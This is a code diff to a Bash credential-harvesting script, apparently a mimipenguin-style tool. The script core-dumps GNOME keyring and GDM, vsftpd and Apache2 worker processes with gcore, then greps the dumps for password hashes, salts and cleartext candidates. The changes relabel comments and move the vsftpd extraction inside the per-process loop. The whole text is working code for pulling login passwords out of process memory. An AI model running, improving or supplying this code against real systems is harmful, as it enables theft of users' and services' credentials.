@@ -87,7 +87,7 @@ while read -r line; do
 done <<< "$1"
 }
 
-#If Kali
+#Support Kali
 if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
         SOURCE="[SYSTEM - GNOME]"
         #get gdm-session-worker [pam/gdm-password] process
@@ -105,7 +105,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	rm -rf "/tmp/dump.${PID}"
 fi
 
-#If Ubuntu
+#Support Ubuntu
 if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
         SOURCE="[SYSTEM - GNOME]"
         #get /usr/bin/gnome-keyring-daemon process
@@ -123,7 +123,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
 	rm -rf "/tmp/dump.${PID}"
 fi
 
-#If Vsftpd 
+#Support VSFTPd - Active Users
 if [[ -e "/etc/vsftpd.conf" ]]; then
         SOURCE="[SYSTEM - VSFTPD]"
         #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
@@ -132,21 +132,20 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 		        gcore -o /tmp/vsftpd $PID >& /dev/null
+		        HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+		        SALT="$(echo $HASH | cut -d'$' -f 3)"
+		        DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+			#Remove dupes to speed up processing
+			DUMP=$(echo $DUMP | tr " " "\n" |sort -u)
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
 		done <<< $PID
 
-	        HASH="$(strings /tmp/vsftpd* | egrep -m 1 '^\$.\$.+$')"
-	        SALT="$(echo $HASH | cut -d'$' -f 3)"
-	        DUMP=$(strings /tmp/vsftpd* | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
-		#Remove dupes to speed up processing
-		DUMP=$(echo $DUMP | tr " " "\n" |sort -u)
-		parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
-		
 		#cleanup
-		rm -rf "/tmp/dump.${pid}"
+		rm -rf /tmp/vsftpd*
 	fi
 fi
 
-#If Apache2
+#Support Apache2 - HTTP BASIC AUTH
 if [[ -e "/etc/apache2/apache2.conf" ]]; then
         SOURCE="[HTTP BASIC - APACHE2]"
         #get all apache workers /usr/sbin/apache2 -k start
